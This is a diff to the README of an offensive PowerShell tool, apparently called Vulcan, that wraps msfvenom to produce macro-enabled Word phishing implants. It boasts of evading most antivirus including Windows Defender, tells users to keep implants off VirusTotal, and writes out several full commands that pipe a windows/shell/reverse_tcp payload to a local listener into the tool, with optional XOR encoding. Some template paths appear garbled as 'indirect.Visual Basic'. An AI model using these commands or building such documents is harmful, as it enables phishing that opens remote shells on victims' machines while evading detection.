@@ -5,16 +5,19 @@
 
 ## A `PowerShell` script that simplifies life and therefore... phishing. 🎣
 
-A `PowerShell` script to automate the creation of consitent and efficient macro-enabled `Word` documents. At the time of writing, the `indirect` template yields great results at evading most AVs, including `Windows Defender`. This script is a wrapper around [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) - made possible thanks to [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) that use templates to create `Word` implant with a one-liner.
+A `PowerShell` script to automate the creation of consitent and efficient macro-enabled `Word` documents. At the time of writing, the `indirect` template yields great results at evading most AVs, including `Windows Defender` in some cases.
 
-The community is greatly encourage toward building and improving upon the existing features. 🐺
+This `PowerShell` script is can be viewed as a third-party add-on to [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) - made possible thanks to [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) - that leverage templates to quickly and easily - *encoded* - create `Word` implants.
+
+Users/stargazers are greatly encouraged toward contributing to improving and extending this project. 🐺
 
 ### ⚠️ Do not be a dummy... Do not submit the produced implants to VirusTotal. 🤢
 
 ## Features
 
-- `VBA` templating -> do not hesitate to submit more templates.
-- Fine-tuning of *bloody* `VBA` line-continuation using `-Treshold`.
+- `Visual Basic` templating (`.\assets\templates`) -> **do not hesitate to submit more templates**.
+- Decoding routines/functions (`.\assets\decoders`) -> **do not hesitate to submit more templates**.
+- Fine-tuning of *bloody* `Visual Basic` line-continuation using `-Treshold`.
 
 ## Requirements
 
@@ -38,15 +41,15 @@ The community is greatly encourage toward building and improving upon the existi
 3. Run `vulcan`:
 
     ```powershell
-    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic"
+    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
     ```
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
 
 ## Usage
 
-`Get-Help -Name Invoke-Vulcan` is your friend... Even better if you use `Get-Help -Name Invoke-Vulcan -Detailed`. Having said that, `Invoke-Vulcan` needs to be fed with a `hex`-formatted shellcode. This can be achieved with:
+`Get-Help -Name Invoke-Vulcan` is your friend... Your best friend is `Get-Help -Name Invoke-Vulcan -Detailed`. Nonetheless, `Invoke-Vulcan` must be fed a `hex`-formatted shellcode. This can be achieved with:
 
 ```powershell
     Get-Content $ShellCode -AsByteStream -Raw | Invoke-Vulcan ...
@@ -58,11 +61,20 @@ The community is greatly encourage toward building and improving upon the existi
 
 ### Examples
 
-- `XOR`-encoded shellcode:
+- Embed a non-encoded shellcode:
 
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.Visual Basic -CaesarShift 5
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic"
+    ```
+
+> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
+
+- Embed a `XOR`-encoded shellcode:
+
+    ```powershell
+    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -CaesarShift 5
     ```
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
